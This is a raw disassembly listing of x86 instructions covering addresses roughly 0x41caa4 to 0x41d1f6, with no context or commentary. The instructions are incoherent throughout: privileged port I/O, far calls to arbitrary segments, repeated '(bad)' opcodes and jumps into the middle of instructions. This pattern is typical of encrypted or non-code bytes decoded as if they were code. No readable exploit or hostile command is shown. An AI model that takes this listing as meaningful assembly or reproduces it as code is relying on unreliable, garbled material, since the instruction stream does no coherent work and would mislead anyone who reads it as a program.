  41caa4:	pop    es
  41caa5:	ja     0x41cac7
  41caa7:	dec    eax
  41caa8:	shl    esp,1
  41caaa:	mov    ecx,ds
  41caac:	out    dx,al
  41caad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caaf:	pop    ss
  41cab0:	ror    BYTE PTR [esi+0x933336a],cl
  41cab6:	frstor [ebp-0x76e35866]
  41cabc:	std    
  41cabd:	mov    al,ds:0xdae97dfb
  41cac2:	push   ebx
  41cac3:	cld    
  41cac4:	push   esp
  41cac5:	loopne 0x41cade
  41cac7:	mov    eax,ds:0x42e9fa51
  41cacc:	lock jecxz 0x41cb15
  41cacf:	jl     0x41ca8a
  41cad1:	mov    ss,WORD PTR [edi-0x1f]
  41cad4:	jo     0x41cac9
  41cad6:	bound  edx,QWORD PTR [esi+0x6a]
  41cad9:	jecxz  0x41cb29
  41cadb:	and    DWORD PTR [esi],0x942dca6b
  41cae1:	push   0xffffffd7
  41cae3:	lock jl 0x41ca7d
  41cae6:	inc    esp
  41cae7:	push   ecx
  41cae8:	cld    
  41cae9:	cli    
  41caea:	sbb    DWORD PTR [ebp+0x6d],edx
  41caed:	aas    
  41caee:	cdq    
  41caef:	push   edx
  41caf0:	xchg   edx,eax
  41caf1:	out    dx,al
  41caf2:	dec    BYTE PTR [edx+0x22621bfe]
  41caf8:	fucomip st,st(2)
  41cafa:	into   
  41cafb:	xor    eax,0x4b33f724
  41cb00:	cmp    eax,0x23db2e26
  41cb05:	and    BYTE PTR [eax+esi*4-0x363fdc10],0x4a
  41cb0d:	ret    
  41cb0e:	shr    DWORD PTR [esi-0x77],0xee
  41cb12:	mov    dl,0xde
  41cb14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb15:	jge    0x41cb3f
  41cb17:	sub    al,BYTE PTR [edx-0x6930bec7]
  41cb1d:	sbb    esi,edi
  41cb1f:	into   
  41cb20:	sti    
  41cb21:	test   eax,0x944b6938
  41cb26:	jo     0x41cacf
  41cb28:	sbb    DWORD PTR [ecx-0x11ceef94],0xaffb7e64
  41cb32:	cwd    
  41cb34:	jg     0x41cb82
  41cb36:	addr16 xor dh,dh
  41cb39:	stos   DWORD PTR es:[edi],eax
  41cb3a:	push   edi
  41cb3b:	rcr    BYTE PTR [ecx],1
  41cb3d:	enter  0x16c9,0xaa
  41cb41:	cmp    esi,DWORD PTR [edx]
  41cb43:	xchg   ecx,eax
  41cb44:	not    dh
  41cb46:	aam    0xd9
  41cb48:	fist   DWORD PTR [ecx+0x2584f45e]
  41cb4e:	nop
  41cb4f:	dec    esp
  41cb50:	push   ss
  41cb51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb52:	push   ebx
  41cb53:	test   eax,0x832fb5e7
  41cb58:	fs mov es,dx
  41cb5c:	mov    al,ds:0x770b483c
  41cb61:	aas    
  41cb62:	mov    dl,bh
  41cb64:	lock inc edi
  41cb66:	iret   
  41cb67:	mov    ah,0x7d
  41cb69:	pop    edi
  41cb6a:	inc    esp
  41cb6b:	lds    ecx,FWORD PTR [ebx+0x46]
  41cb6e:	enter  0xc0ad,0xdd
  41cb72:	fldcw  WORD PTR [ecx+0x5f]
  41cb75:	adc    DWORD PTR [esi+ecx*1-0x3e0b2473],0xc165c764
  41cb80:	pop    edx
  41cb81:	(bad)  
  41cb82:	dec    ebp
  41cb83:	fwait
  41cb84:	pushf  
  41cb85:	sub    ebp,DWORD PTR [ecx+0x3b]
  41cb88:	mov    BYTE PTR [edx-0x7877dcad],0x2
  41cb8f:	mov    bl,0x50
  41cb91:	jo     0x41cb52
  41cb93:	jnp    0x41cb88
  41cb95:	push   es
  41cb96:	mov    bl,0x51
  41cb98:	mov    esp,0xdf40001d
  41cb9d:	and    DWORD PTR [ebx+edi*1],edx
  41cba0:	mov    ch,0x98
  41cba2:	or     eax,0xa578d7fa
  41cba7:	outs   dx,BYTE PTR ds:[esi]
  41cba8:	cmovnp eax,ecx
  41cbab:	nop
  41cbac:	push   0x57af2fa1
  41cbb1:	xchg   ecx,eax
  41cbb2:	imul   ecx,ebx,0x1c
  41cbb5:	jbe    0x41cba8
  41cbb7:	(bad)  
  41cbb9:	dec    esi
  41cbba:	xchg   esi,eax
  41cbbb:	add    esp,ecx
  41cbbd:	push   ecx
  41cbbe:	sbb    bl,BYTE PTR [edx+0x1f211c93]
  41cbc4:	push   ds
  41cbc5:	lahf   
  41cbc6:	mov    ebx,0x96cf6b0d
  41cbcb:	jnp    0x41cba5
  41cbcd:	dec    edx
  41cbce:	repnz push eax
  41cbd0:	pop    ss
  41cbd1:	adc    ch,BYTE PTR [edi+ebp*4]
  41cbd4:	rol    BYTE PTR [ebp-0x4f765b8],1
  41cbda:	jo     0x41cc47
  41cbdc:	dec    edi
  41cbdd:	dec    edi
  41cbde:	sub    bl,BYTE PTR [ecx+0x0]
  41cbe1:	hlt    
  41cbe2:	xchg   ebp,eax
  41cbe3:	sbb    DWORD PTR [eax-0x6e],eax
  41cbe6:	rdtsc  
  41cbe8:	sub    al,0x62
  41cbea:	test   BYTE PTR [ecx+0x4d],ah
  41cbed:	les    esi,FWORD PTR [eax]
  41cbef:	fwait
  41cbf0:	mov    ds:0x5544de8b,al
  41cbf5:	xchg   esp,eax
  41cbf6:	xlat   BYTE PTR ds:[ebx]
  41cbf8:	data16 jge 0x41cc34
  41cbfb:	aaa    
  41cbfc:	sbb    eax,0xd6fd9a08
  41cc01:	mov    ecx,0xd4620e01
  41cc06:	mov    edx,0xe400b961
  41cc0b:	arpl   WORD PTR fs:[edi],si
  41cc0e:	or     eax,0x92a7139d
  41cc13:	push   es
  41cc14:	mov    eax,0x85498b42
  41cc19:	xchg   ebx,eax
  41cc1a:	push   ebp
  41cc1b:	sub    al,0xa2
  41cc1d:	add    al,0xb6
  41cc1f:	lea    edx,ds:0x94a56f4b
  41cc25:	push   esi
  41cc26:	pop    esi
  41cc27:	dec    edx
  41cc28:	outs   dx,BYTE PTR ds:[esi]
  41cc29:	pop    ecx
  41cc2a:	mov    ?,WORD PTR [ebx-0x43bb4182]
  41cc30:	int3   
  41cc31:	adc    edi,DWORD PTR [ebp+0x1dd0bc32]
  41cc37:	jno    0x41cc49
  41cc39:	aas    
  41cc3a:	pushf  
  41cc3b:	or     eax,0xb2dda908
  41cc40:	out    0x5f,eax
  41cc42:	dec    ebp
  41cc43:	add    DWORD PTR [ebx+eax*2],edi
  41cc46:	(bad)  
  41cc47:	out    dx,eax
  41cc48:	cld    
  41cc49:	call   0x9cb34324
  41cc4e:	add    eax,0x11d2d67d
  41cc53:	lods   eax,DWORD PTR ds:[esi]
  41cc54:	ficom  WORD PTR [edi-0x10]
  41cc57:	or     DWORD PTR [edi+0x4b98af77],ecx
  41cc5d:	shl    BYTE PTR [edi+eax*1],0x6c
  41cc61:	nop
  41cc62:	push   ebp
  41cc63:	leave  
  41cc64:	das    
  41cc65:	aaa    
  41cc66:	dec    esi
  41cc67:	inc    esp
  41cc68:	aam    0x99
  41cc6a:	fwait
  41cc6b:	mov    bh,0x21
  41cc6d:	hlt    
  41cc6e:	add    eax,0x9df6b9b7
  41cc73:	jle    0x41cc5f
  41cc75:	popa   
  41cc76:	xor    ah,BYTE PTR [edi+0x6386dc74]
  41cc7c:	add    BYTE PTR [eax+0x2c],al
  41cc7f:	sub    dl,ah
  41cc81:	in     al,0xd
  41cc83:	test   DWORD PTR [ecx+0x3d],0x2c16b141
  41cc8a:	sub    ecx,DWORD PTR [ecx]
  41cc8c:	pop    edi
  41cc8d:	dec    edi
  41cc8e:	pop    esp
  41cc8f:	jmp    0x41cc82
  41cc91:	mov    dl,BYTE PTR ds:0x8e7af4ee
  41cc97:	xlat   BYTE PTR ds:[ebx]
  41cc98:	loope  0x41cc37
  41cc9a:	sbb    bl,BYTE PTR [ebp-0x21485833]
  41cca0:	mov    edx,0xde7ec09b
  41cca5:	mov    dh,0xd1
  41cca7:	dec    ebx
  41cca8:	popf   
  41cca9:	arpl   WORD PTR [edi+eiz*8-0x32],cx
  41ccad:	scas   al,BYTE PTR es:[edi]
  41ccae:	fwait
  41ccaf:	and    ah,bh
  41ccb1:	cdq    
  41ccb2:	add    al,0xb8
  41ccb4:	je     0x41ccc1
  41ccb6:	xchg   BYTE PTR [edx+0x66],dl
  41ccb9:	push   es
  41ccba:	test   al,0x78
  41ccbc:	xchg   ecx,eax
  41ccbd:	dec    eax
  41ccbe:	jns    0x41cc4b
  41ccc0:	mov    ah,0xc9
  41ccc2:	dec    edx
  41ccc3:	or     al,0x7b
  41ccc5:	xor    dl,BYTE PTR [ecx+0xef3881]
  41cccb:	lods   eax,DWORD PTR ds:[esi]
  41cccc:	pop    ebp
  41cccd:	jecxz  0x41ccfc
  41cccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd0:	xchg   esp,eax
  41ccd1:	xor    DWORD PTR [ebp+0x6dd56ffc],esi
  41ccd7:	sbb    ah,0xab
  41ccda:	in     eax,0x17
  41ccdc:	test   eax,0x21fd467b
  41cce1:	dec    eax
  41cce2:	inc    edi
  41cce3:	dec    esp
  41cce4:	mov    al,ds:0xe0b75f29
  41cce9:	fimul  DWORD PTR [edi]
  41cceb:	fisub  WORD PTR [ebx-0x22]
  41ccee:	lock shl DWORD PTR [eax+0x76446876],0x86
  41ccf6:	xchg   esi,eax
  41ccf7:	sub    ebp,DWORD PTR cs:[edx+0x16]
  41ccfb:	cmp    DWORD PTR [esp+edi*8],eax
  41ccfe:	adc    eax,0x69555124
  41cd03:	jo     0x41cd66
  41cd05:	hlt    
  41cd06:	fild   WORD PTR [ebp+edi*8-0x8]
  41cd0a:	(bad)  [edx]
  41cd0c:	je     0x41cd7d
  41cd0e:	idiv   BYTE PTR [eax]
  41cd10:	cmp    ah,BYTE PTR [esi-0x22df2f48]
  41cd16:	mov    bl,0xc1
  41cd18:	test   BYTE PTR [edi-0x2f],dh
  41cd1b:	(bad)
  41cd20:	jp     0x41cd25
  41cd22:	jg     0x41cca9
  41cd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd25:	cmp    BYTE PTR [eax+0x870ed5f],bl
  41cd2b:	into   
  41cd2c:	ror    DWORD PTR [eax-0x4f],1
  41cd2f:	jmp    0x41cd99
  41cd31:	xchg   edi,eax
  41cd32:	arpl   WORD PTR [ebx+edx*4-0x19b701f2],sp
  41cd39:	icebp  
  41cd3a:	push   ecx
  41cd3b:	shr    BYTE PTR [ebp+0x59],cl
  41cd3e:	test   eax,0x340687a9
  41cd43:	rcl    BYTE PTR [ecx+0x2baee9f9],0xfa
  41cd4a:	mov    DWORD PTR [esp+ebx*2],esi
  41cd4d:	push   0xf0941192
  41cd52:	in     al,0xd0
  41cd54:	lahf   
  41cd55:	add    BYTE PTR [ebp-0x7d],bl
  41cd58:	in     eax,0x4a
  41cd5a:	imul   ebp,DWORD PTR [edx],0xd47b4d94
  41cd60:	and    DWORD PTR [edi+eax*2+0x1d2d0fe0],0x7f2905c6
  41cd6b:	adc    al,0x22
  41cd6d:	fwait
  41cd6e:	mov    al,ds:0x7a8d3297
  41cd73:	push   ecx
  41cd74:	imul   ecx,DWORD PTR ds:0x7f451d96,0xad475145
  41cd7e:	enter  0xe0ac,0xf3
  41cd82:	data16 mov ah,0xe1
  41cd85:	ffreep st(3)
  41cd87:	mov    bh,0x75
  41cd89:	mov    cl,0x89
  41cd8b:	aas    
  41cd8c:	in     eax,dx
  41cd8d:	inc    ebx
  41cd8e:	xchg   ebx,eax
  41cd8f:	jmp    0x7a51:0xe28e0ed5
  41cd96:	lock pop edi
  41cd98:	sbb    eax,DWORD PTR [edx]
  41cd9a:	stc    
  41cd9b:	push   ebx
  41cd9c:	repz pop esi
  41cd9e:	pop    ebx
  41cd9f:	mov    ecx,DWORD PTR [esi+0x8]
  41cda2:	add    BYTE PTR [esi-0x55583871],dh
  41cda8:	lds    ebx,FWORD PTR [ecx+0x3865338]
  41cdae:	lock pop esi
  41cdb0:	push   cs
  41cdb1:	scas   al,BYTE PTR es:[edi]
  41cdb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb3:	sti    
  41cdb4:	xchg   ebp,eax
  41cdb5:	and    al,0x64
  41cdb7:	xor    BYTE PTR [ebx-0x5affe46a],dl
  41cdbd:	inc    ebx
  41cdbe:	sbb    BYTE PTR [edi+0x16],0x16
  41cdc2:	lahf   
  41cdc3:	add    eax,0x81244647
  41cdc8:	repz (bad) 
  41cdca:	inc    esp
  41cdcb:	loope  0x41cdb8
  41cdcd:	out    0x27,eax
  41cdcf:	jge    0x41ce17
  41cdd1:	addr16 xchg ah,dh
  41cdd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdd5:	xor    eax,0x39b7f70e
  41cdda:	in     eax,0x89
  41cddc:	pusha  
  41cddd:	push   ss
  41cdde:	cmp    al,0xd1
  41cde0:	add    edx,ebp
  41cde2:	mov    edx,0x1081a6d9
  41cde7:	sbb    eax,0x21da9250
  41cdec:	or     eax,0x540c27e3
  41cdf1:	sbb    BYTE PTR [edi+0x4e85198f],ah
  41cdf7:	aam    0x9f
  41cdf9:	pop    esi
  41cdfa:	add    DWORD PTR [edx+esi*1],ebx
  41cdfd:	jae    0x41cded
  41cdff:	(bad)  
  41ce00:	test   dh,0x74
  41ce03:	les    esp,FWORD PTR ds:0x823a7157
  41ce09:	sar    DWORD PTR [edi-0x305d88ec],0x18
  41ce10:	call   0xcd9c:0x2ee82619
  41ce17:	lods   ax,WORD PTR ds:[esi]
  41ce19:	(bad)  
  41ce1a:	idiv   ecx
  41ce1c:	pop    ebx
  41ce1d:	sub    DWORD PTR [edi+eiz*8-0x33ecbb7b],edx
  41ce24:	pop    eax
  41ce25:	pop    esi
  41ce26:	mov    ch,0x17
  41ce28:	retf   0x2a39
  41ce2b:	mov    al,0x56
  41ce2d:	adc    esp,ecx
  41ce2f:	(bad)  
  41ce30:	sub    DWORD PTR [ebx-0x5f],ebx
  41ce33:	lock jge 0x41ce08
  41ce36:	ret    
  41ce37:	stos   BYTE PTR es:[edi],al
  41ce38:	ins    BYTE PTR es:[edi],dx
  41ce39:	add    esi,ebp
  41ce3b:	mov    dl,0xa9
  41ce3d:	xchg   ebp,eax
  41ce3e:	pushf  
  41ce3f:	div    DWORD PTR [edi-0x35]
  41ce42:	in     al,dx
  41ce43:	jo     0x41ce99
  41ce45:	add    DWORD PTR [edx+0x79],esp
  41ce48:	mov    eax,0x8165ffbb
  41ce4d:	lahf   
  41ce4e:	outs   dx,DWORD PTR ds:[esi]
  41ce4f:	jnp    0x41ce42
  41ce51:	push   edx
  41ce52:	cmp    dl,bl
  41ce54:	lods   al,BYTE PTR ds:[esi]
  41ce55:	sbb    eax,0x3257ae73
  41ce5a:	dec    ecx
  41ce5b:	mov    dl,0xe1
  41ce5d:	lock cwde 
  41ce5f:	daa    
  41ce60:	out    dx,eax
  41ce61:	add    BYTE PTR [ebx+0x5c],ah
  41ce64:	jmp    0x41cea8
  41ce66:	or     ebp,ecx
  41ce68:	je     0x41ce8c
  41ce6a:	jbe    0x41ce35
  41ce6c:	sbb    eax,0x9fdf9c8f
  41ce71:	jmp    0x41ce3b
  41ce73:	outs   dx,BYTE PTR ds:[esi]
  41ce74:	mov    DWORD PTR [esi],ebp
  41ce76:	push   0xffffffa1
  41ce78:	jae    0x41ce09
  41ce7a:	push   ebp
  41ce7b:	pop    edx
  41ce7c:	icebp  
  41ce7d:	adc    al,0xd4
  41ce7f:	mov    eax,ds:0x5cf1856f
  41ce84:	std    
  41ce85:	pop    ss
  41ce86:	xor    ebx,DWORD PTR [ebp+0x34]
  41ce89:	jmp    0x322af98d
  41ce8e:	mov    ebx,DWORD PTR [edi*2-0x7c641bb7]
  41ce95:	add    ecx,DWORD PTR [edx]
  41ce97:	cmp    al,0x37
  41ce99:	jbe    0x41ce52
  41ce9b:	push   edx
  41ce9c:	xchg   edx,eax
  41ce9d:	mov    edi,cs
  41ce9f:	mov    al,ds:0x48c6fc2b
  41cea4:	mov    ebx,0xd76cf633
  41cea9:	js     0x41cea3
  41ceab:	imul   DWORD PTR [edi]
  41cead:	loope  0x41ceb4
  41ceaf:	xchg   edx,eax
  41ceb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceb1:	call   0xeb825f61
  41ceb6:	mov    ah,0x24
  41ceb8:	push   ss
  41ceb9:	cmp    esp,DWORD PTR [ecx+0x18]
  41cebc:	xlat   BYTE PTR ds:[ebx]
  41cebd:	cmc    
  41cebe:	arpl   WORD PTR [ecx-0x2a3f9d88],cx
  41cec4:	or     al,0xcc
  41cec6:	call   0x85dc9980
  41cecb:	adc    eax,0xcd535aaf
  41ced0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced1:	test   al,0x57
  41ced3:	daa    
  41ced4:	std    
  41ced5:	outs   dx,BYTE PTR ds:[esi]
  41ced6:	lods   eax,DWORD PTR ds:[si]
  41ced8:	call   0x31dc:0xa94d881a
  41cedf:	mov    eax,0x8307f47f
  41cee4:	mov    BYTE PTR [edx+0x53],0x90
  41cee8:	and    DWORD PTR [ecx],edx
  41ceea:	xchg   edx,eax
  41ceeb:	and    BYTE PTR [esi],dh
  41ceed:	loop   0x41cf58
  41ceef:	in     eax,0x7a
  41cef1:	mov    ebx,0xbde902dd
  41cef7:	dec    eax
  41cef8:	cs push edx
  41cefa:	das    
  41cefb:	imul   ebp,DWORD PTR [eax+0x6868cacc],0xbf21ce7a
  41cf05:	jnp    0x41cf52
  41cf07:	loop   0x41cec5
  41cf09:	mov    al,ds:0x3bd28abf
  41cf0e:	icebp  
  41cf0f:	push   esp
  41cf10:	cmp    al,0xbc
  41cf12:	push   ecx
  41cf13:	call   DWORD PTR [eax+edi*8+0x366c0bc0]
  41cf1a:	inc    esi
  41cf1b:	mov    esp,0xf12b833
  41cf20:	iret   
  41cf21:	scas   eax,DWORD PTR es:[edi]
  41cf22:	fsub   DWORD PTR [ebx-0x7]
  41cf25:	or     bh,BYTE PTR [edx]
  41cf27:	mov    ds:0xa268718c,al
  41cf2c:	sub    eax,0xe699c078
  41cf31:	retf   0xb7e9
  41cf34:	sub    BYTE PTR [ebp+0x5a],0x1a
  41cf38:	push   ebx
  41cf39:	sar    BYTE PTR [edi],cl
  41cf3b:	stos   BYTE PTR es:[edi],al
  41cf3c:	adc    esp,DWORD PTR [edi]
  41cf3e:	or     edx,DWORD PTR [ebp-0x29bb4f19]
  41cf44:	xlat   BYTE PTR ds:[ebx]
  41cf45:	mov    al,ds:0xd35ba478
  41cf4a:	push   ecx
  41cf4b:	ss push ss
  41cf4d:	dec    edx
  41cf4e:	stos   DWORD PTR es:[edi],eax
  41cf4f:	shl    DWORD PTR [ecx-0x40],cl
  41cf52:	lods   eax,DWORD PTR ds:[esi]
  41cf53:	or     BYTE PTR [eax],ch
  41cf55:	mov    cl,0x1d
  41cf57:	imul   ecx,DWORD PTR [edx+ebp*4+0x2b],0x5b
  41cf5c:	stos   DWORD PTR es:[edi],eax
  41cf5d:	rcl    BYTE PTR [ecx-0x653ed365],0x6b
  41cf64:	imul   edx,DWORD PTR ds:0x6a8690b7,0x37
  41cf6b:	push   0x79
  41cf6d:	mov    BYTE PTR [edi+0x4639f451],dl
  41cf73:	adc    esi,DWORD PTR ds:0xb5aea4c9
  41cf79:	stos   DWORD PTR es:[edi],eax
  41cf7a:	sbb    DWORD PTR [esi+0x1e],ecx
  41cf7d:	das    
  41cf7e:	xor    DWORD PTR [ecx-0x31],esi
  41cf81:	adc    DWORD PTR [ebx],eax
  41cf83:	cs scas al,BYTE PTR es:[edi]
  41cf85:	or     BYTE PTR [edx+0x50fe4f28],dl
  41cf8b:	mov    ah,0x20
  41cf8d:	mov    edx,0xf1f1165b
  41cf92:	jl     0x41d009
  41cf94:	out    0xf,eax
  41cf96:	das    
  41cf97:	push   cs
  41cf98:	daa    
  41cf99:	lock mov ds:0xf08097a2,al
  41cf9f:	mov    ebp,0xe37b39b6
  41cfa4:	lods   al,BYTE PTR ds:[esi]
  41cfa5:	inc    edx
  41cfa6:	mov    ch,0x2b
  41cfa8:	lock or eax,0xfa9f6226
  41cfae:	mov    dh,0x3a
  41cfb0:	pop    ds
  41cfb1:	and    DWORD PTR [ebp-0x52],ebp
  41cfb4:	(bad)
  41cfb8:	call   0x58eb2334
  41cfbd:	mov    BYTE PTR [ecx+eiz*4-0x2f],cl
  41cfc1:	pushf  
  41cfc2:	js     0x41cf92
  41cfc4:	cmp    eax,edx
  41cfc6:	lds    edx,FWORD PTR [eax+edi*4+0x11]
  41cfca:	sub    BYTE PTR [eax-0x1f8665d7],ah
  41cfd0:	jb     0x41cf62
  41cfd2:	sub    eax,0x79c8c2cd
  41cfd7:	push   esp
  41cfd8:	inc    edi
  41cfd9:	jecxz  0x41d007
  41cfdb:	sbb    BYTE PTR [ebp-0x4922bf77],dh
  41cfe1:	xor    BYTE PTR [edi],cl
  41cfe3:	rcl    bl,1
  41cfe5:	addr16 aam 0xb4
  41cfe8:	jae    0x41d026
  41cfea:	push   0xfa5f0f8b
  41cfef:	xchg   ebp,eax
  41cff0:	push   esi
  41cff1:	ins    BYTE PTR es:[edi],dx
  41cff2:	or     ch,BYTE PTR [esi]
  41cff4:	adc    BYTE PTR [esi+0x5c],bl
  41cff7:	xor    DWORD PTR [ebp-0x1aaa7191],0xffffffb1
  41cffe:	das    
  41cfff:	add    al,0xf3
  41d001:	in     eax,dx
  41d002:	inc    esp
  41d003:	ret    0x1dae
  41d006:	sbb    dl,BYTE PTR [eax-0x48e133cb]
  41d00c:	push   eax
  41d00d:	cmp    ch,BYTE PTR [edi]
  41d00f:	mov    cl,0x85
  41d011:	jno    0x41d03d
  41d013:	jb     0x41d04f
  41d015:	rcr    ah,0x83
  41d018:	lea    ebx,[ecx+edx*2+0x33]
  41d01c:	inc    edi
  41d01d:	out    0x57,eax
  41d01f:	sbb    ebx,DWORD PTR [ebp+0x368b0e80]
  41d025:	sbb    al,0x18
  41d027:	xor    bl,BYTE PTR [ecx]
  41d029:	les    ecx,FWORD PTR [edi-0x5651c908]
  41d02f:	add    DWORD PTR [edi],edx
  41d031:	cli    
  41d032:	jo     0x41d00e
  41d034:	call   0x7df1:0x2c0e6e88
  41d03b:	(bad)  
  41d03c:	in     eax,dx
  41d03d:	js     0x41d09b
  41d03f:	mov    esp,0x8ba4977f
  41d044:	mov    ecx,0xda06c007
  41d049:	push   ds
  41d04a:	sub    ecx,DWORD PTR [ecx-0x6f]
  41d04d:	dec    esi
  41d04e:	jb     0x41d02c
  41d050:	repnz and eax,0x84e1d472
  41d056:	xchg   BYTE PTR [edx+0x7f],ch
  41d059:	das    
  41d05a:	lock test al,0x42
  41d05d:	rol    BYTE PTR [ebx],1
  41d05f:	data16 daa 
  41d061:	pop    esp
  41d062:	sub    BYTE PTR [ecx+edx*2-0x64],al
  41d066:	sbb    al,0xf7
  41d068:	or     al,0xd7
  41d06a:	cmp    BYTE PTR [edx-0x33],ah
  41d06d:	xchg   edi,eax
  41d06e:	stos   BYTE PTR es:[edi],al
  41d06f:	mov    ds:0xd8960e72,eax
  41d074:	inc    eax
  41d075:	fldcw  WORD PTR [ebx-0x2ec6ee6b]
  41d07b:	ins    BYTE PTR es:[edi],dx
  41d07c:	xor    edx,0xffffffb6
  41d07f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d080:	xchg   ebp,eax
  41d081:	imul   eax,DWORD PTR [esi-0x58],0xffffffb1
  41d085:	mov    ss,WORD PTR [esi+0x6c7b62d5]
  41d08b:	jno    0x41d08a
  41d08d:	addr16 inc ebx
  41d08f:	es or  al,0xf9
  41d092:	sahf   
  41d093:	pushf  
  41d094:	hlt    
  41d095:	mov    esp,ecx
  41d097:	cmp    edi,eax
  41d099:	push   edi
  41d09a:	fsub   QWORD PTR [edx+0x3e]
  41d09d:	xor    cl,BYTE PTR [ecx+0x1]
  41d0a0:	jo     0x41d083
  41d0a2:	xchg   esi,eax
  41d0a3:	test   eax,0xa432d4e5
  41d0a8:	enter  0xc55a,0x36
  41d0ac:	dec    ecx
  41d0ad:	mov    eax,0xd03fc95c
  41d0b2:	xor    DWORD PTR [edx],ebp
  41d0b4:	out    dx,al
  41d0b5:	into   
  41d0b6:	fidivr WORD PTR [ebp+0x7]
  41d0b9:	dec    ebp
  41d0ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0bb:	push   esp
  41d0bc:	inc    edx
  41d0bd:	mov    al,0x4b
  41d0bf:	test   al,bh
  41d0c1:	push   0x8647f1f4
  41d0c6:	or     al,0xde
  41d0c8:	mov    ebp,0x77dda021
  41d0cd:	pop    es
  41d0ce:	fisttp QWORD PTR [eax-0x12]
  41d0d1:	out    0xb7,eax
  41d0d3:	push   0xa1cc206
  41d0d8:	mov    dl,0xea
  41d0da:	fadd   QWORD PTR [ecx+0x0]
  41d0dd:	jns    0x41d0a9
  41d0df:	pop    ebx
  41d0e0:	dec    ebx
  41d0e1:	pop    es
  41d0e2:	push   es
  41d0e3:	fwait
  41d0e4:	in     al,dx
  41d0e5:	addr16 das 
  41d0e7:	push   edx
  41d0e8:	es out 0x68,al
  41d0eb:	push   esp
  41d0ec:	imul   edi,DWORD PTR [ebp-0x4292f4a9],0xffffffaf
  41d0f3:	adc    eax,0x5e77dc9e
  41d0f8:	clc    
  41d0f9:	in     eax,dx
  41d0fa:	jg     0x41d12b
  41d0fc:	jl     0x41d163
  41d0fe:	fisubr DWORD PTR [edx]
  41d100:	jle    0x41d15d
  41d102:	inc    eax
  41d103:	mov    ecx,0xc408260c
  41d108:	enter  0x20,0xcf
  41d10c:	enter  0xd9cc,0x7a
  41d110:	std    
  41d111:	mov    cl,0xe6
  41d113:	add    al,0x92
  41d115:	mov    edi,0x1cc3af22
  41d11a:	(bad)  
  41d11b:	sub    esp,DWORD PTR [ecx+0x1b48927b]
  41d121:	fsub   st,st(1)
  41d123:	pop    eax
  41d124:	push   0xffffffac
  41d126:	xchg   ebx,eax
  41d127:	dec    ebp
  41d128:	rcr    BYTE PTR [edi+0xa],cl
  41d12b:	mov    dl,0xfb
  41d12d:	jo     0x41d0e9
  41d12f:	jecxz  0x41d13b
  41d131:	mov    eax,0xd5e33b88
  41d136:	mov    bl,0xdf
  41d138:	call   0x9df5:0x8874f63a
  41d13f:	stos   DWORD PTR es:[edi],eax
  41d140:	xor    ebx,DWORD PTR [edx-0x59]
  41d143:	jo     0x41d131
  41d145:	pop    esi
  41d146:	leave  
  41d147:	sbb    BYTE PTR [edi+0x31],0x33
  41d14b:	mov    al,0x64
  41d14d:	repnz popf 
  41d14f:	cwde   
  41d150:	outs   dx,DWORD PTR ds:[esi]
  41d151:	and    BYTE PTR [edi-0x5a],cl
  41d154:	aam    0x28
  41d156:	lods   eax,DWORD PTR ds:[esi]
  41d157:	pop    esi
  41d158:	lods   al,BYTE PTR ds:[esi]
  41d159:	sub    edi,ecx
  41d15b:	(bad)  
  41d15c:	out    0xfe,eax
  41d15e:	out    dx,eax
  41d15f:	cwde   
  41d160:	add    bl,BYTE PTR [edi-0x28]
  41d163:	xor    ebx,ebx
  41d165:	sbb    esi,DWORD PTR [ebx-0x46]
  41d168:	cmp    dh,dh
  41d16a:	in     eax,dx
  41d16b:	add    al,0xb0
  41d16d:	push   0xffffffbf
  41d16f:	inc    edi
  41d170:	inc    bp
  41d172:	add    cl,BYTE PTR [esi]
  41d174:	xchg   edi,eax
  41d175:	aad    0xd1
  41d177:	jae    0x41d131
  41d179:	bound  ebp,QWORD PTR [esi]
  41d17b:	call   0x88d2ea5c
  41d180:	out    dx,eax
  41d181:	mov    ch,0x17
  41d183:	test   esi,ebp
  41d185:	xchg   BYTE PTR [ebx-0x45eb40da],bh
  41d18b:	dec    ebp
  41d18c:	out    dx,eax
  41d18d:	sbb    al,0xe0
  41d18f:	xchg   edx,eax
  41d190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d191:	push   0xf7039a76
  41d196:	push   esp
  41d197:	or     DWORD PTR [esi-0x5e00156d],ebp
  41d19d:	push   ss
  41d19e:	inc    eax
  41d19f:	fdivr  QWORD PTR [edi]
  41d1a1:	enter  0xfe01,0x58
  41d1a5:	jns    0x41d15a
  41d1a7:	or     al,0x3
  41d1a9:	addr16 xchg ebx,eax
  41d1ab:	inc    ebp
  41d1ac:	add    DWORD PTR [ecx-0x4f69b931],0x35
  41d1b3:	xor    ebx,edx
  41d1b5:	sbb    eax,0x7500c8fb
  41d1ba:	lods   eax,DWORD PTR ds:[esi]
  41d1bb:	ret    0x8163
  41d1be:	mov    ebp,edx
  41d1c0:	xchg   edx,eax
  41d1c1:	and    ecx,DWORD PTR [ebx-0x19696dc0]
  41d1c7:	xor    ah,BYTE PTR [eax+0x6c404420]
  41d1cd:	in     eax,dx
  41d1ce:	lahf   
  41d1cf:	jne    0x41d187
  41d1d1:	cmp    ecx,DWORD PTR [esp+eax*1-0x3b]
  41d1d5:	add    esp,0xffffffcb
  41d1d8:	inc    ebx
  41d1d9:	inc    eax
  41d1da:	inc    esi
  41d1db:	add    al,0xb5
  41d1dd:	xor    bl,ch
  41d1df:	out    dx,eax
  41d1e0:	les    esi,FWORD PTR [ecx]
  41d1e2:	fs ret 
  41d1e4:	test   eax,0x47bbc9b4
  41d1e9:	mov    ch,0x2a
  41d1eb:	dec    edi
  41d1ec:	aam    0xa8
  41d1ee:	pop    edi
  41d1ef:	loope  0x41d173
  41d1f1:	aaa    
  41d1f2:	sub    BYTE PTR [ecx],al
  41d1f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1f5:	iret   
  41d1f6:	dec    edi
